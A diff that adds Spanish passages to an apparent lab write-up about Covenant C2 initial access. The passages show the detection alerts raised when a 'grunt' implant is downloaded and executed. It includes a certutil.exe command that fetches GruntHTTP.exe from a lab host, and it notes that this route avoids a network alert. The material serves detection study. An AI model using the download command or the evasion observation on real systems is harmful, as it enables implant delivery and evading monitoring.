@@ -107,10 +107,45 @@ Se nos generan dos alertas
 
 ![image008.png](/uploads/InitialAccess/image008.png)
 
+Una primera alerta, 
+
+![image008.png](/uploads/InitialAccess/image008.png)
+
+Y una segunda alerta,
+
+![image010.png](/uploads/InitialAccess/image010.png)
+
+
+Tenemos otras opciones para descargar el fichero, como puede ser certutil.exe
+
+certutil.exe -urlcache -split -f http://192.168.2.14:8000/GruntHTTP.exe grunt.exe
 
 
 
+![image011.png](/uploads/InitialAccess/image011.png)
 
+
+
+Como vemos los procesos son diferentes, a diferencia, no se llega a crear una alerta de network.
+
+Ejecución
+Se nos genera la siguiente información:
+
+![image012.png](/uploads/InitialAccess/image012.png)
+
+La primera alerta, la creación de un proceso
+
+![image013.png](/uploads/InitialAccess/image013.png)
+
+Conexión de red:
+
+![image014.png](/uploads/InitialAccess/image014.png)
+
+QueryDNS:
+
+![image015.png](/uploads/InitialAccess/image015.png)
+
+Conexión realiza, debería aparecernos un nuevo grunt.
 
 
 
